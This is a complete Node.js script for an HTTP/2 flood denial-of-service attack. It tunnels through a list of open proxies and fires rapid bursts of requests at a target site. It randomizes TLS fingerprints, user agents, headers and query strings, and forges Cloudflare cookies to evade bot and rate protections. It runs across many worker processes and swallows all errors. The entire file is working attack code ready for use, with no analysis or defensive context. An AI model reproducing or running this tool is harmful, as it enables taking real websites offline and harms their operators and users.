const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}
function readLines(file) {
    return fs.readFileSync(file, "utf-8").split(/\r?\n/).filter(Boolean);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomElement(arr) {
    return arr[randomIntn(0, arr.length)];
}
function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};
const parsedTarget = url.parse(args.target);
const sigs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1'
];
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    '*/*', 'image/*', 'image/webp,image/apng', 'text/html', 'application/json', 'application/xml',
    'application/pdf', 'text/css', 'application/javascript'
];
const langHeaders = [
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'en-ZA', 'fr-FR', 'ja-JP', 'ar-EG', 'de-DE', 'es-ES'
];
const encodingHeaders = [
    'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch', 'identity', 'compress', 'br'
];
const methods = ["GET", "HEAD", "POST", "DELETE", "PATCH"];
const cacheControls = ['max-age=0', 'no-cache', 'no-store', 'must-revalidate'];
const secChUa = [
    '"Chromium";v="137", "Not/A)Brand";v="24"',
    '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
];
const secChUaPlatform = ["Linux", "Windows", "macOS", "Android", "iOS"];
const rateHeaders = [
    { "Akamai-Origin-Hop": randstr(12) },
    { "Proxy-Client-IP": randstr(12) },
    { "Via": randstr(12) },
    { "Cluster-IP": randstr(12) },
    { "User-Agent": randstr(12) }
];
const proxies = readLines(args.proxyFile);
function shuffleArray(a) {
    for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
    }
}
shuffleArray(proxies);

class NetSocket {
    HTTP({ host, port, address, timeout }, cb) {
        const payload = `CONNECT ${address} HTTP/1.1\r\nHost: ${address}\r\nConnection: Keep-Alive\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const conn = net.connect({ host, port, noDelay: true });
        conn.setTimeout(timeout * 1000);
        conn.setKeepAlive(true, 60000);
        conn.once("connect", () => conn.write(payload));
        conn.once("data", chunk => {
            const res = chunk.toString();
            if (!res.includes("200 Connection established")) {
                conn.destroy();
                return cb(undefined, "invalid proxy response");
            }
            cb(conn, undefined);
        });
        conn.once("timeout", () => { conn.destroy(); cb(undefined, "timeout"); });
        conn.once("error", e => { conn.destroy(); cb(undefined, e.message); });
    }
}

const customUserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
];
function generateUserAgent() {
    if (Math.random() < 0.5) {
        return new UserAgent({
            deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
            platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
        }).toString();
    }
    return randomElement(customUserAgents);
}
const netSocket = new NetSocket();

function generateHeaders() {
    const cookieValue = `${randstr(8)}=${randstr(24)}; __cf_bm=${randstr(43)}; cf_clearance=${randstr(32)}`;
    return {
        ":method": randomElement(methods),
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
        ":scheme": "https",
        "user-agent": generateUserAgent(),
        "accept": randomElement(acceptHeaders),
        "accept-encoding": randomElement(encodingHeaders),
        "accept-language": randomElement(langHeaders),
        "cache-control": randomElement(cacheControls),
        "sec-ch-ua": randomElement(secChUa),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": randomElement(secChUaPlatform),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "XMLHttpRequest",
        "cookie": cookieValue,
        "referer": `https://${parsedTarget.host}/`,
        "origin": `https://${parsedTarget.host}`
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [host, port] = proxyAddr.split(":");
    const proxyOptions = {
        host,
        port: parseInt(port),
        address: `${parsedTarget.host}:443`,
        timeout: 15
    };
    netSocket.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            connection?.destroy();
            return;
        }
        const tlsOpts = Math.random() < 0.5 ? {
            ALPNProtocols: ['h2'],
            handshakeTimeout: 5000,
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'P-256:P-384',
            sigalgs: randomElement(sigs),
            honorCipherOrder: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        } : {
            ALPNProtocols: ['h2'],
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'auto',
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                crypto.constants.SSL_OP_NO_QUERY_MTU,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOpts);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });
        let activeIntervals = [];
        client.once("connect", () => {
            const floodInterval = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(floodInterval);
                    activeIntervals = activeIntervals.filter(i => i !== floodInterval);
                    return;
                }
                const headers = { ...generateHeaders(), ...randomElement(rateHeaders) };
                for (let i = 0; i < args.rate; i++) {
                    try {
                        const req = client.request(headers, { endStream: true });
                        req.on("response", () => {
                            req.close();
                        });
                        req.on("error", () => {
                            req.destroy();
                        });
                        req.end();
                    } catch {
                    }
                }
            }, randomIntn(150, 350));
            activeIntervals.push(floodInterval);
        });
        client.once("close", () => {
            client.destroy();
            activeIntervals.forEach(clearInterval);
        });
        client.once("error", () => {
            client.destroy();
            activeIntervals.forEach(clearInterval);
        });
    });
}

if (cluster.isMaster) {
    console.clear();
    for (let i = 0; i < args.threads; i++) cluster.fork();
    console.log('\x1b[1m\x1b[34mTarget:\x1b[0m ' + parsedTarget.host);
    console.log('\x1b[1m\x1b[33mDuration:\x1b[0m ' + args.time + 's');
    console.log('\x1b[1m\x1b[32mThreads:\x1b[0m ' + args.threads);
    console.log('\x1b[1m\x1b[31mRequests/s:\x1b[0m ' + args.rate);
} else {
    setInterval(runFlooder, 1000);
}
setTimeout(() => process.exit(0), args.time * 1000);
